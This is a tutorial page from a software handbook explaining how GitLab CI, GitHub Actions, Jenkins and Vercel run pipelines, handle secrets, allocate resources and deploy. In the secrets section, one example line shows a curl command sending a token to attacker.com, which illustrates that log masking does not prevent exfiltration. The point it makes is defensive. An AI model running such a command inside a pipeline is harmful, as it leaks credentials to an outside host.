# CI/CD Platforms

How a repository becomes a pipeline: which file to add, how the platform reaches your code, where secrets live, and what resources your jobs actually get. Covers **GitLab CI**, **GitHub Actions**, **Jenkins**, and **Vercel**.

______________________________________________________________________

## 0. "CI/CD" Is Three Things

The abbreviation hides an ambiguity: **CI** means one thing, **CD** means two, and the difference between the two CDs is a business decision, not a technical one.

| Term   | Stands for                 | The question it answers                      | Ends with                                                |
| ------ | -------------------------- | -------------------------------------------- | -------------------------------------------------------- |
| **CI** | Continuous **Integration** | *Does this change break anything?*           | A verified build + test result on every push             |
| **CD** | Continuous **Delivery**    | *Could we release right now if we chose to?* | An artifact ready to deploy — a human presses the button |
| **CD** | Continuous **Deployment**  | *Why would a human press the button?*        | Every green commit is live in production, automatically  |

```
flowchart LR
    P[git push] --> L[Lint]
    L --> T[Test]
    T --> B[Build artifact]
    B --> S[Deploy to staging]
    S --> G{Manual gate?}
    G -->|Yes: Continuous Delivery| M[Human approves]
    G -->|No: Continuous Deployment| PR[Production]
    M --> PR
```

Everything left of "Build artifact" is **CI**. Everything right of it is **CD**. The only difference between Delivery and Deployment is whether that gate exists.

Practical reading:

- **CI is non-negotiable** and the cheapest thing on this page. If you do nothing else, run your tests on every push.
- **Continuous Delivery is the sane default** for most teams. You are always *able* to ship; you decide *when*.
- **Continuous Deployment requires earning it** — strong test coverage, feature flags, fast rollback, and real monitoring. Without those it is just an automated way to break production.

Vercel is Continuous Deployment out of the box: push to the production branch and it is live. GitLab, GitHub, and Jenkins give you the gate and let you choose.

For where this sits in the wider delivery process, see [Lifecycle → CI/CD](https://locchh.github.io/sw-handbook/software/basics/lifecycle/#cicd). The rest of this page is mechanics.

______________________________________________________________________

## 1. What Makes a Repo "Have CI/CD"

One file, in a path the platform looks for. That is the entire on-ramp.

| Platform           | File you add        | Location                        |
| ------------------ | ------------------- | ------------------------------- |
| **GitLab CI**      | `.gitlab-ci.yml`    | Repo root                       |
| **GitHub Actions** | `ci.yml` (any name) | `.github/workflows/`            |
| **Jenkins**        | `Jenkinsfile`       | Repo root                       |
| **Vercel**         | *nothing required*  | `vercel.json` at root, optional |

GitLab, GitHub, and Jenkins read that file and do what it says. **Vercel is different**: it inspects your `package.json` and directory layout, detects the framework, and applies a preset install/build command. You only add `vercel.json` to *override* routing, headers, or build settings.

The file is a contract: *on this event, run these steps, in this environment*. Everything else is the platform's job.

______________________________________________________________________

## 2. How the Platform Reaches Your Code

The pipeline is the same everywhere:

```
flowchart LR
    D[git push] --> F[Forge: GitLab / GitHub]
    F --> Q[Job queue]
    Q --> R[Runner / agent]
    R --> C[Clone repo, read config]
    C --> E[Execute steps]
    E --> S[Report status back to commit or PR]
```

What differs is **which direction the connection opens** — and that decides your firewall, not your YAML.

```
flowchart TB
    subgraph Outbound
      RN[Runner on your network] -->|long-poll, outbound only| GC[GitLab / GitHub coordinator]
    end
    subgraph Inbound
      GH[Forge webhook] -->|HTTP POST, inbound| JK[Jenkins must be reachable]
    end
```

| Platform           | Connection                                                                       | Runs the job                         | Needs an inbound port?                |
| ------------------ | -------------------------------------------------------------------------------- | ------------------------------------ | ------------------------------------- |
| **GitLab CI**      | Runner registers with a token, then **long-polls** the coordinator               | GitLab-hosted or self-hosted runners | **No**                                |
| **GitHub Actions** | Same model — runner polls out                                                    | GitHub-hosted or self-hosted runners | **No**                                |
| **Jenkins**        | Forge sends a **webhook** to your Jenkins URL                                    | Jenkins controller + agents          | **Yes** (or fall back to SCM polling) |
| **Vercel**         | You install the Vercel **Git App** (OAuth) on the org; the forge webhooks Vercel | Vercel's build machines              | No (Vercel is the public endpoint)    |

This is the practical difference people trip over. **GitLab and GitHub runners work from behind NAT with no ports open** — they dial out. **Jenkins is a server**: the forge must be able to reach it, which means a public URL, a tunnel, or SCM polling (which is slower and wasteful). That single fact drives most of the "why is Jenkins harder to host" experience.

Vercel's model is a third thing: you are not running CI, you are granting a SaaS read access to your repo and letting it build. Push to any branch → **preview deployment**; merge to the production branch → **production deployment**.

______________________________________________________________________

## 3. Minimum Working Config

GitLab

```
# .gitlab-ci.yml
stages: [test, build, deploy]

test:
  stage: test
  image: python:3.12
  script:
    - pip install -r requirements.txt
    - pytest

build:
  stage: build
  image: docker:27
  services: [docker:27-dind]
  script:
    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .
    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
```

GitHub

```
# .github/workflows/ci.yml
name: CI
on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - run: pip install -r requirements.txt
      - run: pytest
```

Jenkins

```
// Jenkinsfile
pipeline {
  agent { docker { image 'python:3.12' } }
  options { timeout(time: 20, unit: 'MINUTES') }
  stages {
    stage('Test') {
      steps {
        sh 'pip install -r requirements.txt'
        sh 'pytest'
      }
    }
  }
}
```

Vercel

```
// vercel.json - only if you need to override the detected defaults
{
  "buildCommand": "npm run build",
  "outputDirectory": "dist",
  "framework": "vite"
}
```

`services: [docker:27-dind]` in the GitLab example is how you get a Docker daemon inside a job — the "Docker-in-Docker" pattern that trips up most first pipelines. GitHub's hosted runners already have a daemon, so `docker build` just works.

______________________________________________________________________

## 4. Environment Variables and Secrets

Every platform separates **non-secret config** from **secrets**. Use both.

| Platform    | Where you set it                                               | Scoping                                                                | Masking                                  |
| ----------- | -------------------------------------------------------------- | ---------------------------------------------------------------------- | ---------------------------------------- |
| **GitLab**  | Settings → CI/CD → Variables, or `variables:` in YAML          | Per project/group, **protected** (protected branches only), **masked** | Masked variables hidden in logs          |
| **GitHub**  | Settings → Secrets and variables (`secrets.*` and `vars.*`)    | Repo, org, or **environment** (with required reviewers)                | `secrets.*` auto-redacted in logs        |
| **Jenkins** | Credentials plugin, then `withCredentials` or `environment {}` | Global, folder, or per-job                                             | Masked when bound as credentials         |
| **Vercel**  | Project → Settings → Environment Variables                     | Per environment: Production / Preview / Development                    | Mark as **Sensitive** to make write-only |

Rules that matter:

- **Never put a secret in the YAML file.** It is in git history forever. Reference it: `$MY_TOKEN`, `${{ secrets.MY_TOKEN }}`.
- **Prefer OIDC over long-lived cloud keys.** GitLab, GitHub, and Jenkins can all exchange a short-lived signed token for AWS/GCP/Azure credentials. No static keys to leak or rotate.
- **Scope secrets to protected branches / environments.** A production deploy key available to every feature branch is a production deploy key available to anyone who can open a branch.
- **Fork pull requests are hostile input.** Secrets are withheld from fork PRs by default on GitHub — do not defeat that with `pull_request_target` unless you know exactly what you are doing. Vercel requires explicit authorization to deploy a fork PR for the same reason.
- **Masking is not security.** It hides the literal string in logs; it does not stop `curl attacker.com -d "$TOKEN"`.

______________________________________________________________________

## 5. Resource Control: CPU, RAM, Disk

What your job actually gets, and where you change it.

### GitHub Actions — fixed tiers

Hosted runner specs, **as of August 2026** ([reference](https://docs.github.com/en/actions/reference/runners/github-hosted-runners)):

| Label           | Repo type   | CPU | RAM   | SSD   |
| --------------- | ----------- | --- | ----- | ----- |
| `ubuntu-latest` | **Public**  | 4   | 16 GB | 14 GB |
| `ubuntu-latest` | **Private** | 2   | 8 GB  | 14 GB |
| `ubuntu-slim`   | Either      | 1   | 5 GB  | 14 GB |

Public repos get double the machine, free and unlimited. `ubuntu-slim` is cheap but has a **15-minute job timeout**. You cannot tune these — you pick a label, or use larger runners (paid), or self-host.

### GitLab — you configure the runner

Self-hosted runners take hard limits in `config.toml`:

```
concurrent = 4                     # total jobs across all runners

[[runners]]
  request_concurrency = 1
  [runners.docker]
    memory = "4g"
    memory_swap = "4g"
    memory_reservation = "2g"
    cpus = "2"
```

On the Kubernetes executor, set requests and limits per job instead:

```
variables:
  KUBERNETES_CPU_REQUEST: "1"
  KUBERNETES_CPU_LIMIT: "2"
  KUBERNETES_MEMORY_REQUEST: "2Gi"
  KUBERNETES_MEMORY_LIMIT: "4Gi"
```

### Jenkins — executors and agents

Jenkins has no per-job limits of its own. Control comes from three places:

- **Executors per agent** — how many jobs run concurrently on one machine. Set it to the core count, not higher.
- **Docker agent args** — `agent { docker { image 'node:22'; args '--memory=4g --cpus=2' } }`.
- **Kubernetes plugin pod templates** — real requests/limits, the same as any pod.

Never run builds on the controller. One runaway job takes down Jenkins itself.

### Vercel — pick a machine

| Machine  | vCPU | Memory | Disk  |
| -------- | ---- | ------ | ----- |
| Standard | 2–4  | 8 GB   | 32 GB |
| Enhanced | 8    | 16 GB  | 64 GB |
| Turbo    | 30   | 60 GB  | 64 GB |

Plus fixed limits: **45-minute build timeout**, **1 GB build cache** retained one month, and a per-plan cap on concurrent builds. Elastic machines auto-size and bill per CPU-minute.

### Disk and inodes

Nobody documents this and it is the most common self-hosted runner failure: **runners fill up**. Docker layers, node_modules, and caches accumulate across jobs on a long-lived machine, and the failure is often inode exhaustion rather than bytes — `df -h` looks fine while every build fails.

```
df -h && df -i                     # check both
docker system prune -af --volumes  # on a schedule, not after the outage
```

See [Running a Server §6](https://locchh.github.io/sw-handbook/software/tool_tip/server_operations/#6-disk-the-three-ways-it-fills-up) for the full diagnosis. Ephemeral runners (fresh VM or pod per job) make the problem disappear entirely — prefer them.

______________________________________________________________________

## 6. How the Deploy Actually Happens

Two models, and it is worth knowing which one you are in:

```
flowchart LR
    B[CI job builds artifact] --> R[Registry or artifact store]
    R --> P[Push: CI connects out and applies]
    R --> G[Pull: agent in cluster watches registry]
    P --> T[Target: server, k8s, CDN]
    G --> T
```

- **Push deploy** — the CI job holds production credentials and runs `ssh`, `kubectl apply`, `helm upgrade`, or `docker compose up`. Simple; your CI system becomes a high-value target.
- **Pull deploy (GitOps)** — an agent inside the target environment watches a repo or registry and reconciles. CI never holds production credentials. More moving parts, much better blast radius.

Vercel is a third model again: build output goes straight to its own edge network and CDN. Every deploy is immutable and independently addressable, so **rollback is repointing an alias**, not rebuilding.

______________________________________________________________________

## 7. Best Practices

- **Pipeline fails fast and cheap.** Lint and unit tests first, integration and builds after. Do not wait ten minutes to learn a formatting error.
- **Pin action and image versions.** `actions/checkout@v4`, `python:3.12` — not `latest`. Better still, pin actions by commit SHA; tags are mutable.
- **Cache dependencies, not build output.** Restore `~/.cache/pip` or `node_modules`; rebuilding artifacts from a stale cache produces mysteries.
- **One job, one responsibility.** Parallelise across jobs and let the platform schedule them.
- **Make the pipeline runnable locally.** If CI runs `make test`, you can run `make test`. Debugging by pushing commits is the slowest loop in software.
- **Set a timeout on every job.** The default is generous and a hung job burns minutes until it hits it.
- **Protect the production branch.** Required reviews, required status checks, no direct pushes — see [Lifecycle → Version Control](https://locchh.github.io/sw-handbook/software/basics/lifecycle/#version-control).
- **Keep secrets out of forks and PRs from untrusted sources.**
- **Make deploys idempotent and reversible.** Re-running should be safe; rolling back should not require a rebuild.

______________________________________________________________________

## References

- **GitLab** — [CI/CD YAML reference](https://docs.gitlab.com/ci/yaml/) · [CI/CD variables](https://docs.gitlab.com/ci/variables/) · [Runner executors](https://docs.gitlab.com/runner/executors/) · [Configure runners](https://docs.gitlab.com/ci/runners/configure_runners/) · [Pipeline security](https://docs.gitlab.com/ci/pipeline_security/)
- **GitHub** — [Workflow syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions) · [GitHub-hosted runners](https://docs.github.com/en/actions/reference/runners/github-hosted-runners) · [Secrets](https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions) · [Security hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- **Jenkins** — [Pipeline syntax](https://www.jenkins.io/doc/book/pipeline/syntax/) · [Using a Jenkinsfile](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/) · [Using credentials](https://www.jenkins.io/doc/book/using/using-credentials/) · [Docker with Pipeline](https://www.jenkins.io/doc/book/pipeline/docker/) · [Kubernetes plugin](https://plugins.jenkins.io/kubernetes/)
- **Vercel** — [How Vercel builds your application](https://vercel.com/docs/fundamentals/builds) · [Git deployments](https://vercel.com/docs/git) · [Environment variables](https://vercel.com/docs/environment-variables) · [Project configuration](https://vercel.com/docs/project-configuration) · [Managing builds](https://vercel.com/docs/builds/managing-builds)
- **General** — [Continuous Delivery](https://continuousdelivery.com/) (Humble & Farley) · [The Twelve-Factor App](https://12factor.net/) on config in the environment · [OpenSSF: securing CI/CD](https://openssf.org/)
